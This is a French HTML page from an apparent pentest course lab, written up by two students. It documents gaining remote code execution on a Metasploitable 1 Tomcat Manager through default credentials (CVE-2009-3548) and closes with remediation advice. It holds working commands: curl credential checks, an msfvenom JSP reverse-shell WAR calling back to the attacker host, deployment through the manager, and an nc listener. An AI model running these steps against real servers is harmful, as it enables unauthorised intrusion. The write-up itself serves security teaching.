@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tomcat Manager — Déploiement WAR — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">Tomcat Manager — Déploiement d'un WAR malveillant</h1>
+    <h2 class="doc-subtitle">Exécution de code à distance (RCE) via l'interface d'administration Tomcat protégée par des identifiants par défaut</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>HTTP (Apache Tomcat/Coyote 5.5) — port <code class="mono">8180</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 1 — <code class="mono">192.168.56.102</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3548">CVE-2009-3548</a> (identifiants manager par défaut)</td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Shell distant</strong> en tant que <code class="mono">tomcat55</code> (compte de service)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <blockquote class="evidence">
+    <strong>Note réseau.</strong> Les deux rédacteurs travaillent sur deux réseaux host-only
+    VirtualBox distincts. Cette page utilise le réseau de Josaphat (<code>vboxnet0</code>) : la
+    cible est en <code>192.168.56.102</code> et le poste Kali en <code>192.168.56.1</code>. Côté
+    Jules, le même service se trouve sur <code>172.28.128.4</code> (réseau <code>vboxnet1</code>,
+    comme indiqué au sommaire). Seules les adresses IP changent ; la démarche est identique.
+  </blockquote>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le scan de reconnaissance sur le port 8180 révèle un serveur <strong>Apache Tomcat 5.5</strong>
+  (moteur JSP Coyote 1.1). Un Tomcat expose par défaut une application d'administration
+  (<code>/manager</code>) qui permet de déployer des applications web : c'est la première piste à
+  vérifier, car un accès à cette interface équivaut à une exécution de code sur le serveur.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms1-tomcat/01-recon-nmap.png" alt="Résultat du scan nmap sur le port 8180">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sC -sV -p 8180 192.168.56.102</code> : le service
+      est identifié comme <code>Apache Tomcat/Coyote JSP engine 1.1</code>, titre HTTP
+      <code>Apache Tomcat/5.5</code>.</span>
+      <span class="fname">images/ms1-tomcat/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>Avant de chercher un exploit, on teste l'hypothèse la plus simple : l'interface manager
+  est-elle accessible avec les identifiants par défaut de Metasploitable
+  (<code>tomcat:tomcat</code>) ? On interroge deux fois l'URL du manager, sans puis avec
+  authentification, en n'affichant que le code HTTP de réponse :</p>
+
+  <pre class="terminal">$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.102:8180/manager/html
+401
+$ curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.102:8180/manager/html
+200</pre>
+
+  <p>Le code <code>401</code> sans authentification puis <code>200</code> avec
+  <code>tomcat:tomcat</code> confirment que <strong>les identifiants par défaut ouvrent le
+  manager</strong>. C'est précisément la faille : le manager autorise le déploiement
+  d'applications web arbitraires, donc un accès au manager permet l'exécution de code à distance
+  (RCE, pour <em>Remote Code Execution</em>).</p>
+
+  <figure class="capture" id="cap-creds">
+    <img src="../images/ms1-tomcat/02-manager-creds.png" alt="Test des identifiants par défaut sur le manager Tomcat">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Les deux requêtes <code>curl</code> à la suite : <code>401</code> sans
+      authentification, puis <code>200</code> avec <code>-u tomcat:tomcat</code> — preuve que les
+      identifiants par défaut donnent accès au manager.</span>
+      <span class="fname">images/ms1-tomcat/02-manager-creds.png</span>
+    </figcaption>
+  </figure>
+
+  <p>Question suivante, indépendante de tout outil : cette faiblesse correspond-elle à une
+  vulnérabilité connue et outillée ? On commence par le plus léger (<code>searchsploit</code>),
+  puis on va chercher la CVE précise dans le module Metasploit correspondant :</p>
+
+  <pre class="terminal">$ searchsploit tomcat manager
+
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Apache Tomcat Manager - Application Deployer   | multiple/remote/16317.rb
+Apache Tomcat Manager - Application Upload (A  | multiple/remote/31433.rb
+---------------------------------------------- ---------------------------------</pre>
+
+  <p>Une faille connue existe bien : l'abus du <em>Application Deployer</em> du manager. Pour
+  obtenir la CVE exacte et le mécanisme, on lit les informations du module Metasploit
+  correspondant :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
+
+       Name: Apache Tomcat Manager Application Deployer Authenticated Code Execution
+     Module: exploit/multi/http/tomcat_mgr_deploy
+  Disclosed: 2009-11-09
+...
+Description:
+  This module can be used to execute a payload on Apache Tomcat servers that
+  have an exposed "manager" application. The payload is uploaded as a WAR archive
+  containing a jsp application using a PUT request.
+...
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
+  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html</pre>
+
+  <p>La section <code>References</code> confirme <strong>CVE-2009-3548</strong>.</p>
+
+  <blockquote class="evidence">
+    <strong>Mécanisme.</strong> CVE-2009-3548 ne désigne pas un bug de code mais une
+    <strong>configuration par défaut dangereuse</strong> : Tomcat est livré avec des comptes
+    manager par défaut (<code>tomcat/tomcat</code>, etc.). Le manager expose une fonction de
+    déploiement (<code>/manager/deploy</code>) qui accepte une archive <code>.war</code> et la
+    rend immédiatement accessible comme application web. Un <code>.war</code> peut contenir une
+    page JSP — c'est-à-dire du code Java exécuté côté serveur. En déposant un <code>.war</code>
+    contenant un reverse shell JSP puis en visitant la page, on fait exécuter notre code par le
+    processus Tomcat, avec les droits de l'utilisateur système qui le fait tourner
+    (<code>tomcat55</code>).
+  </blockquote>
+
+  <figure class="capture" id="cap-recherche">
+    <img src="../images/ms1-tomcat/03-recherche-module.png" alt="searchsploit tomcat manager puis info du module dans msfconsole">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc"><code>searchsploit tomcat manager</code> confirme qu'un exploit connu
+      existe (<em>Application Deployer</em> / <em>Upload</em>), puis <code>info</code> sur le
+      module <code>exploit/multi/http/tomcat_mgr_deploy</code> en donne le nom complet :
+      <em>Authenticated Code Execution</em>.</span>
+      <span class="fname">images/ms1-tomcat/03-recherche-module.png</span>
+    </figcaption>
+  </figure>
+
+  <figure class="capture" id="cap-info-cve">
+    <img src="../images/ms1-tomcat/04-info-cve.png" alt="Section References du module, CVE-2009-3548">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Sortie de <code>info</code> : la <code>Description</code> explique le
+      mécanisme (dépôt d'un WAR contenant une JSP via une requête PUT) et la section
+      <code>References</code> donne <strong>CVE-2009-3548</strong>.</span>
+      <span class="fname">images/ms1-tomcat/04-info-cve.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Plutôt que de lancer directement le module Metasploit, on reproduit sa logique à la main
+  (<code>msfvenom</code> + <code>curl</code>) pour comprendre chaque étape. <strong>a)</strong>
+  On génère d'abord le WAR piégé — un reverse shell JSP qui rappellera le poste Kali
+  (<code>LHOST=192.168.56.1</code>) :</p>
+
+  <pre class="terminal">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o shell.war
+Payload size: 1108 bytes
+Final size of war file: 1108 bytes
+Saved as: shell.war
+
+$ unzip -l shell.war | grep -i jsp
+     1498  2026-10-15 20:49   idukjczquyzxqav.jsp</pre>
+
+  <p>Le nom de la JSP interne est <strong>aléatoire</strong> (<code>idukjczquyzxqav.jsp</code>
+  ici) ; il servira d'URL pour déclencher le shell.</p>
+
+  <figure class="capture" id="cap-msfvenom">
+    <img src="../images/ms1-tomcat/05-msfvenom-war.png" alt="Génération du WAR avec msfvenom et nom de la JSP interne">
+    <figcaption>
+      <strong class="idx">5.</strong>
+      <span class="desc">Génération du WAR (<code>Saved as: shell.war</code>) puis inspection de
+      son contenu : le nom aléatoire de la JSP embarquée
+      (<code>idukjczquyzxqav.jsp</code>).</span>
+      <span class="fname">images/ms1-tomcat/05-msfvenom-war.png</span>
+    </figcaption>
+  </figure>
+
+  <p><strong>b)</strong> On démarre un listener sur le poste Kali (<code>nc -lvnp 4444</code>)
+  pour recevoir la connexion retour, puis <strong>c)</strong> on déploie le WAR via le manager,
+  avec les identifiants trouvés à l'étape 2 :</p>
+
+  <pre class="terminal">$ curl -s -u tomcat:tomcat -T shell.war "http://192.168.56.102:8180/manager/deploy?path=/shell"
+OK - Deployed application at context path /shell
+
+$ curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/list" | grep /shell
+/shell:running:0:shell</pre>
+
+  <p>La réponse <code>OK - Deployed</code> confirme que l'application piégée est en ligne, et
+  <code>/shell:running</code> le reconfirme dans la liste des applications.</p>
+
+  <figure class="capture" id="cap-deploy">
+    <img src="../images/ms1-tomcat/06-deploy-war.png" alt="Déploiement du WAR via le manager et confirmation en ligne">
+    <figcaption>
+      <strong class="idx">6.</strong>
+      <span class="desc">Déploiement du WAR piégé via <code>/manager/deploy?path=/shell</code>
+      avec les identifiants <code>tomcat:tomcat</code> : la réponse
+      <code>OK - Deployed application at context path /shell</code> confirme que l'application
+      est en ligne.</span>
+      <span class="fname">images/ms1-tomcat/06-deploy-war.png</span>
+    </figcaption>
+  </figure>
+
+  <p><strong>d)</strong> Enfin, on déclenche le shell en visitant la JSP déployée (son exécution
+  ouvre la connexion vers le listener) :</p>
+
+  <pre class="terminal">$ curl -s "http://192.168.56.102:8180/shell/idukjczquyzxqav.jsp"</pre>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>Dans la session reçue sur le listener <code>nc</code> (port 4444), les commandes exécutées
+  s'exécutent <strong>sur la cible</strong> :</p>
+
+  <pre class="terminal">connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 50464
+$ id
+uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
+$ hostname
+metasploitable</pre>
+
+  <p>Le shell est confirmé en tant que <strong><code>tomcat55</code></strong> (le compte de
+  service qui fait tourner Tomcat) sur l'hôte <code>metasploitable</code>. Il ne s'agit pas de
+  <code>root</code> : l'élévation de privilèges constituera une étape distincte.</p>
+
+  <figure class="capture" id="cap-preuve">
+    <img src="../images/ms1-tomcat/07-session-shell.png" alt="Session reverse shell confirmée en tant que tomcat55">
+    <figcaption>
+      <strong class="idx">7.</strong>
+      <span class="desc">À droite, le <code>curl</code> qui déclenche la JSP ; à gauche, le
+      listener <code>nc</code> reçoit la connexion et exécute <code>id</code> →
+      <code>uid=110(tomcat55)</code> sur <code>metasploitable</code>.</span>
+      <span class="fname">images/ms1-tomcat/07-session-shell.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Changer ou supprimer les comptes manager par défaut
+      (<code>tomcat/tomcat</code>, <code>admin</code>…) dans <code>tomcat-users.xml</code> —
+      c'est la cause racine de CVE-2009-3548 ; utiliser des mots de passe forts et uniques.</li>
+      <li>Restreindre l'accès à l'interface manager par adresse IP (valve
+      <code>RemoteAddrValve</code>) et la réserver à un réseau d'administration ; ne jamais
+      l'exposer publiquement.</li>
+      <li>Mettre à jour Tomcat : la version 5.5 est obsolète et n'est plus maintenue.</li>
+      <li>Appliquer le principe de moindre privilège : Tomcat tourne déjà ici sous un compte
+      dédié non privilégié (<code>tomcat55</code>), ce qui limite l'impact direct — mais l'accès
+      obtenu reste un point de départ pour une élévation de privilèges.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms1/josa/tomcat.md"><code>ms1/josa/tomcat.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2009-3548 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3548">nvd.nist.gov/vuln/detail/CVE-2009-3548</a></li>
+    <li>Documentation manager Tomcat 5.5 : <a href="http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html">tomcat.apache.org/tomcat-5.5-doc/manager-howto.html</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — TOMCAT MANAGER (DÉPLOIEMENT WAR)</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
